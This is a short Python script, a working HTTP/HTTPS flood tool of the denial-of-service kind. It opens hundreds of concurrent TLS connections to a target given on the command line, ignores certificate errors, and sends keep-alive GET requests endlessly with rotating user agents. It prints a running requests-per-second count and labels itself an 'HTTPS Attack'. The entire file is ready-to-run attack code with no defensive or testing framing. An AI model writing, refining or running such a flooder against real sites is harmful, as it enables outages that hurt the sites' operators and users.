import asyncio
import argparse
import time
import sys
import random
import ssl # <--- NEW: Import SSL library

ops = 0
start_time = time.time()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/91.0.4472.114"
]

async def attack(target, port, ssl_ctx):
    global ops
    payload = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nUser-Agent: {random.choice(user_agents)}\r\n\r\n".encode()

    while True:
        try:
            # <--- CHANGE: Pass the ssl_context here
            reader, writer = await asyncio.open_connection(target, port, ssl=ssl_ctx)
            
            while True:
                writer.write(payload)
                await writer.drain()
                ops += 1
        except:
            await asyncio.sleep(0.1)
            pass

async def monitor():
    global ops
    while True:
        await asyncio.sleep(1)
        elapsed = time.time() - start_time
        if elapsed > 0:
            sys.stdout.write(f"\r[+] HTTPS Requests: {ops} | RPS: {ops/elapsed:.2f}/s")
            sys.stdout.flush()

async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-p", "--port", type=int, default=443)
    parser.add_argument("-c", "--concurrency", type=int, default=500)
    args = parser.parse_args()

    # <--- NEW: Create the SSL Context to ignore certificate errors
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    print(f"[+] Starting HTTPS Attack on {args.target}...")

    tasks = []
    for _ in range(args.concurrency):
        tasks.append(asyncio.create_task(attack(args.target, args.port, ssl_ctx)))
    
    tasks.append(asyncio.create_task(monitor()))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass


    